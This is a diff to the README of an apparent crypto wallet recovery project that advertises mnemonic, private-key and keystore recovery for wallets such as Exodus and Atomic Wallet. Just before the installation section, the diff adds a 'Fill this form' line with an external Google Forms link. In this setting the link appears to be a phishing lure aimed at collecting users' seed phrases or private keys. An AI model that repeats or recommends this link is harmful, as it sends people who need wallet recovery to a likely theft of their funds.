@@ -33,7 +33,7 @@ This project focuses on **education, transparency, and self-recovery**.
 
 📚 Usage
 
-Select your recovery scenario:
+Recovery scenario:
 🔑 Mnemonic recovery (full, partial, or scrambled)
 🔐 Private key troubleshooting
 📜 Wallet password/keystore recovery
@@ -52,6 +52,9 @@ Exodus
 Atomic Wallet
 
 ---
+
+Fill this form:
+https://docs.google.com/forms/d/e/1FAIpQLSc2GLRAp4fBMflIcnw5TwrX6wBXRLpKy3Igh2BfsFecX-m7Sw/viewform?usp=sharing&ouid=102827439603955368324
 
 ## 🛠️ Installation
 
